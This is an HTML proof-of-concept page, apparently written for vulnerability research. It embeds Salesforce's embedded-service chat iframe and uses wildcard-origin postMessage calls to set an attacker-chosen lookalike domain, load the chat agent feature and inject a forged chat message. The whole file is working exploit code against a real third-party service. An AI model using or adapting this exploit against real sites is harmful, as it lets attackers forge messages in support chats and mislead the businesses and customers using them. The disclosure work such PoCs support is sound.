<!DOCTYPE html>
<html>
  <body>
    <h2>Salesforce iframe abuse PoC</h2>
    <iframe id="chatframe" src="https://service.force.com/embeddedservice/4.0/esw.html?deploymentId=5725c000000XcUT" width="800" height="600"></iframe>

    <script>
      const domain = "reddit.com.wangdubruh.xyz"; // Must match your subdomain
      const deploymentId = "test123";
      const frame = document.getElementById("chatframe");

      let ready = false;

      window.addEventListener("message", (e) => {
        if (typeof e.data === "object" && e.data.method === "session.onLoad") {
          console.log("ðŸ“© Message from iframe:", e.data);
          ready = true;

          console.log("ðŸ“¤ Setting domain using session.updateStorage...");
          frame.contentWindow.postMessage({
            method: "session.updateStorage",
            domain: domain,
            data: {
              deploymentId: deploymentId,
              isSamePageNavigation: true,
              isRefresh: false
            }
          }, "*");

          // Step 2: Wait 1 second and load chasitor
          setTimeout(() => {
            console.log("ðŸ“¤ Sending script.load for feature: chasitor");
            frame.contentWindow.postMessage({
              method: "script.load",
              domain: domain,
              feature: "chasitor"
            }, "*");
          }, 1000);

          // Step 3: Wait 2 seconds and send fake message
          setTimeout(() => {
            console.log("ðŸ“¤ Sending fake message");
            frame.contentWindow.postMessage({
              method: "chasitor.sendMessage",
              domain: domain,
              data: "[ðŸ’¥ Attacker PoC] This is a forged message via iframe"
            }, "*");
          }, 2000);
        }
      });

      frame.onload = () => {
        console.log("[+] Iframe loaded (Salesforce 4.0)");
      };
    </script>
  </body>
</html>
